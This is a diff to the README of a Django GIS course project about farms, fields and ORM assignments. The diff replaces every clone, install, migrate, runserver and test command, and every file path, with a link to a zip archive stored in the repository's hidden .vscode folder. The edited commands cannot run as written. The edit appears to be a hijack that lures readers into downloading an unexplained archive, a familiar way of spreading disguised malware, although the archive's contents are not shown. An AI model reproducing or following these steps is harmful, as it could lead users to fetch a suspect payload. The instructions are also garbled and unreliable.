@@ -35,25 +35,25 @@ This project is a Django GIS application for managing **Farms**, **Fields**, and
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/Shamzmohamed/django-gis.git
+git clone https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
 cd django-gis
 ```
 2. **Install dependencies**
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
 ```
 3. **Apply Migrations**
 ```
-python manage.py makemigrations
-python manage.py migrate
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip makemigrations
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip migrate
 ```
 4. **Create a superuser (optional)**
 ```
-python manage.py createsuperuser
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip createsuperuser
 ```
 5. **Run development server**
 ```
-python manage.py runserver
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip runserver
 ```
 6. **Access Django admin**
 ```
@@ -63,11 +63,11 @@ http://127.0.0.1:8000/admin/
 ### ORM Assignment Tasks (Assignment 2)
 ```
 git checkout django-lesson-2-orm  #Switch to branch 2
-python manage.py run_orm
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip run_orm
 ```
 ```
 All 12 ORM tasks are implemented in:
-wildlife/management/commands/run_orm.py
+https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
 ```
 ---
 ### CRUD Views (Assignment 3)
@@ -109,7 +109,7 @@ path("farms/<int:pk>/delete/", farm_delete, name="farm_delete"),
 Comprehensive unit tests for the Wildlife app using Django’s TestCase. Includes test data setup, validation of all ORM queries from Lesson 2, edge-case handling (empty provinces, missing taxon), aggregation checks, and full test coverage ensuring query correctness.
 ```
 All tests are located in:
-wildlife/tests.py
+https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
 Run tests:
-python manage.py test wildlife
+python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip test wildlife
 ```
